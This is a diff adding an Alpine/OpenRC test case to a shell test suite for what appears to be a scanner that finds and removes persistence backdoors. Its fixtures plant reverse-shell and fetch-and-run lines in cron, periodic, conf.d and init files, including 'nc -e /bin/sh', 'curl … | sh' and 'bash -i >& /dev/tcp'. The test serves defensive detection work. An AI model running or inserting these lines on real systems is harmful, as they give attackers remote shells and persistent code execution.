@@ -225,6 +225,34 @@ t_ok "the stock crontab lines survive" grep -q 'run-parts' "$R/etc/crontab"
 t_has "$r" "Removed:" "summary counts what was removed"
 t_ok "undo lines were written" sh -c "grep -q 'ld.so.preload' '$O'/bt-undo-*.log 2>/dev/null || grep -rq 'ld.so.preload' '$O'/*undo* 2>/dev/null"
 
+t_start "Alpine (OpenRC, busybox crond)"
+build_root "$T_TMP/alp"; mkdir -p "$R/etc/runlevels/default"
+mk /etc/crontabs/root '*/15 * * * * run-parts /etc/periodic/15min' '0 * * * * nc -e /bin/sh 203.0.113.5 4444'
+mk /etc/periodic/15min/sync '#!/bin/sh' 'curl -s http://203.0.113.5/x | sh'
+mk /etc/periodic/daily/clean '#!/bin/sh' 'find /tmp -mtime +7 -delete'; own /etc/periodic/daily/clean
+mk /etc/local.d/net.start '#!/bin/sh' '/usr/local/bin/helper &'
+mk /etc/local.d/README 'not a script'
+mk /etc/conf.d/sshd 'SSHD_OPTS=""' 'start_pre() { bash -i >& /dev/tcp/203.0.113.5/9 0>&1; }'
+mk /etc/conf.d/crond 'CRON_OPTS="-c /etc/crontabs"'
+mk /etc/init.d/updater '#!/sbin/openrc-run' 'command=/dev/shm/.u' 'command_args="--daemon"'
+mk /etc/init.d/sshd '#!/sbin/openrc-run' 'command=/usr/sbin/sshd'; own /etc/init.d/sshd
+touch -t "$OLD" "$R/etc/periodic/daily/clean"
+r=$(run --root "$R" --out "$O" --batch --no-color --max 200 --areas cron,boot 2>&1)
+t_has "$r" "/etc/crontabs/root" "root's crontab in /etc/crontabs is read"
+t_has "$r" "runs as root: 0 * * * * nc -e" "and the bad line in it found"
+t_has "$r" "/etc/periodic/15min/sync" "a bad /etc/periodic script is found"
+t_has "$r" "runs as root every 15min" "with when it runs"
+t_hasnt "$r" "/etc/periodic/daily/clean" "a packaged periodic script is not"
+t_has "$r" "/etc/local.d/net.start" "a hand-added local.d start script is found"
+t_has "$r" "runs as root at every boot (OpenRC local)" "with what it does"
+t_hasnt "$r" "/etc/local.d/README" "only .start and .stop files count"
+t_has "$r" "sourced as root when the sshd service starts" "a bad line in conf.d is found"
+t_hasnt "$r" "/etc/conf.d/crond" "a plain conf.d file is not"
+t_has "$r" "/etc/init.d/updater" "a hand-added init script is found"
+t_hasnt "$r" "/etc/init.d/sshd" "the packaged sshd script is not"
+D=$(printf '%s\n' "$r" | sed -n 's/^All results: //p' | tail -n 1)
+t_ok "an init script is fixed as a service on OpenRC (stop, disable, quarantine)" grep -q '/etc/init.d/updater.*unit' "$D/findings.txt"
+
 if command -v script >/dev/null 2>&1 && script -qc true /dev/null >/dev/null 2>&1; then
     t_start "questions in a terminal"
     build_root "$T_TMP/bad2"; plant
